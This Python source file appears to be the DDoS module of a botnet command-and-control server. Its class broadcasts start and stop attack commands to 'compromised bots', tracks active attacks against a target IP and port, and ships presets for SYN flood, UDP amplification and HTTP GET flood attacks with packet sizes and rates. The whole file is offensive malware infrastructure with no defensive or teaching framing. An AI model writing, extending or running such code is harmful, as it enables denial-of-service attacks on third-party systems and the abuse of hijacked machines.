#!/usr/bin/env python3
"""
DDoS Coordinator for C2 Server
Manages distributed denial of service attacks using compromised bots
"""

import threading
import time
import json
from typing import List, Dict, Optional
from database import C2Database
from communication import C2CommunicationHandler

class DDoSCoordinator:
    def __init__(self, db: C2Database, comm_handler: C2CommunicationHandler):
        self.db = db
        self.comm_handler = comm_handler
        self.active_attacks = {}
        self.attack_lock = threading.Lock()
    
    def start_ddos_attack(self, target_ip: str, target_port: int = 80, 
                         attack_type: str = "syn_flood", duration: int = 60,
                         packet_size: int = 1024, packet_rate: int = 1000) -> Optional[int]:
        """
        Start a coordinated DDoS attack
        
        Args:
            target_ip: Target IP address
            target_port: Target port number
            attack_type: Type of attack (syn_flood, udp_flood, http_flood)
            duration: Attack duration in seconds
            packet_size: Size of packets to send
            packet_rate: Packets per second per bot
        
        Returns:
            Attack ID if successful, None if failed
        """
        try:
            # Get available bots
            available_bots = self.comm_handler.get_connected_bots()
            
            if not available_bots:
                print("No bots available for attack")
                return None
            
            # Create attack record in database
            attack_id = self.db.start_ddos_attack(
                target_ip, target_port, attack_type, available_bots
            )
            
            # Prepare attack parameters
            attack_params = {
                "target_ip": target_ip,
                "target_port": target_port,
                "attack_type": attack_type,
                "duration": duration,
                "packet_size": packet_size,
                "packet_rate": packet_rate,
                "attack_id": attack_id
            }
            
            # Send attack command to all available bots
            success_count = self.comm_handler.broadcast_command(
                "start_ddos", attack_params
            )
            
            if success_count > 0:
                # Store attack info
                with self.attack_lock:
                    self.active_attacks[attack_id] = {
                        "target_ip": target_ip,
                        "target_port": target_port,
                        "attack_type": attack_type,
                        "participating_bots": available_bots,
                        "start_time": time.time(),
                        "duration": duration,
                        "status": "active"
                    }
                
                print(f"DDoS attack {attack_id} started against {target_ip}:{target_port}")
                print(f"Participating bots: {success_count}/{len(available_bots)}")
                
                # Schedule attack stop
                stop_timer = threading.Timer(
                    duration, 
                    self._auto_stop_attack, 
                    args=[attack_id]
                )
                stop_timer.daemon = True
                stop_timer.start()
                
                return attack_id
            else:
                print("Failed to start attack - no bots responded")
                self.db.stop_ddos_attack(attack_id)
                return None
                
        except Exception as e:
            print(f"Error starting DDoS attack: {e}")
            return None
    
    def stop_ddos_attack(self, attack_id: int) -> bool:
        """
        Stop a specific DDoS attack
        
        Args:
            attack_id: ID of the attack to stop
        
        Returns:
            True if successful, False otherwise
        """
        try:
            with self.attack_lock:
                if attack_id not in self.active_attacks:
                    print(f"Attack {attack_id} not found or already stopped")
                    return False
                
                attack_info = self.active_attacks[attack_id]
                attack_info["status"] = "stopping"
            
            # Send stop command to participating bots
            stop_params = {"attack_id": attack_id}
            success_count = self.comm_handler.broadcast_command(
                "stop_ddos", stop_params
            )
            
            # Update database
            self.db.stop_ddos_attack(attack_id)
            
            # Remove from active attacks
            with self.attack_lock:
                if attack_id in self.active_attacks:
                    del self.active_attacks[attack_id]
            
            print(f"DDoS attack {attack_id} stopped")
            print(f"Stop command sent to {success_count} bots")
            
            return True
            
        except Exception as e:
            print(f"Error stopping DDoS attack {attack_id}: {e}")
            return False
    
    def stop_all_attacks(self) -> int:
        """
        Stop all active DDoS attacks
        
        Returns:
            Number of attacks stopped
        """
        stopped_count = 0
        
        with self.attack_lock:
            active_attack_ids = list(self.active_attacks.keys())
        
        for attack_id in active_attack_ids:
            if self.stop_ddos_attack(attack_id):
                stopped_count += 1
        
        return stopped_count
    
    def _auto_stop_attack(self, attack_id: int):
        """Automatically stop an attack after duration expires"""
        print(f"Auto-stopping attack {attack_id} due to duration expiry")
        self.stop_ddos_attack(attack_id)
    
    def get_attack_status(self, attack_id: int) -> Optional[Dict]:
        """
        Get status of a specific attack
        
        Args:
            attack_id: ID of the attack
        
        Returns:
            Attack status dictionary or None if not found
        """
        with self.attack_lock:
            if attack_id in self.active_attacks:
                attack_info = self.active_attacks[attack_id].copy()
                attack_info["elapsed_time"] = time.time() - attack_info["start_time"]
                return attack_info
        
        return None
    
    def get_all_active_attacks(self) -> List[Dict]:
        """
        Get status of all active attacks
        
        Returns:
            List of active attack dictionaries
        """
        active_attacks = []
        
        with self.attack_lock:
            for attack_id, attack_info in self.active_attacks.items():
                status = attack_info.copy()
                status["attack_id"] = attack_id
                status["elapsed_time"] = time.time() - status["start_time"]
                active_attacks.append(status)
        
        return active_attacks
    
    def get_attack_statistics(self) -> Dict:
        """
        Get DDoS attack statistics
        
        Returns:
            Statistics dictionary
        """
        stats = {
            "active_attacks": len(self.active_attacks),
            "available_bots": len(self.comm_handler.get_connected_bots()),
            "total_attacks_today": 0,  # Would need to query database
            "attack_types_used": set()
        }
        
        # Add attack types from active attacks
        with self.attack_lock:
            for attack_info in self.active_attacks.values():
                stats["attack_types_used"].add(attack_info["attack_type"])
        
        stats["attack_types_used"] = list(stats["attack_types_used"])
        
        return stats
    
    def create_attack_preset(self, name: str, target_ip: str, target_port: int,
                           attack_type: str, duration: int, packet_size: int,
                           packet_rate: int) -> Dict:
        """
        Create a reusable attack preset
        
        Returns:
            Attack preset dictionary
        """
        preset = {
            "name": name,
            "target_ip": target_ip,
            "target_port": target_port,
            "attack_type": attack_type,
            "duration": duration,
            "packet_size": packet_size,
            "packet_rate": packet_rate,
            "created_at": time.time()
        }
        
        return preset
    
    def execute_attack_preset(self, preset: Dict) -> Optional[int]:
        """
        Execute a predefined attack preset
        
        Args:
            preset: Attack preset dictionary
        
        Returns:
            Attack ID if successful, None if failed
        """
        return self.start_ddos_attack(
            target_ip=preset["target_ip"],
            target_port=preset["target_port"],
            attack_type=preset["attack_type"],
            duration=preset["duration"],
            packet_size=preset["packet_size"],
            packet_rate=preset["packet_rate"]
        )

# Predefined attack presets
ATTACK_PRESETS = {
    "light_syn_flood": {
        "name": "Light SYN Flood",
        "attack_type": "syn_flood",
        "duration": 30,
        "packet_size": 64,
        "packet_rate": 100
    },
    "heavy_syn_flood": {
        "name": "Heavy SYN Flood",
        "attack_type": "syn_flood",
        "duration": 120,
        "packet_size": 1024,
        "packet_rate": 1000
    },
    "udp_amplification": {
        "name": "UDP Amplification",
        "attack_type": "udp_flood",
        "duration": 60,
        "packet_size": 1472,
        "packet_rate": 500
    },
    "http_flood": {
        "name": "HTTP GET Flood",
        "attack_type": "http_flood",
        "duration": 90,
        "packet_size": 512,
        "packet_rate": 200
    }
}

if __name__ == "__main__":
    # Test the DDoS coordinator
    from database import C2Database
    from communication import C2CommunicationHandler
    
    db = C2Database()
    comm_handler = C2CommunicationHandler(db=db)
    ddos_coordinator = DDoSCoordinator(db, comm_handler)
    
    print("DDoS Coordinator initialized")
    print("Available attack presets:")
    for preset_name, preset in ATTACK_PRESETS.items():
        print(f"  - {preset_name}: {preset['name']}")
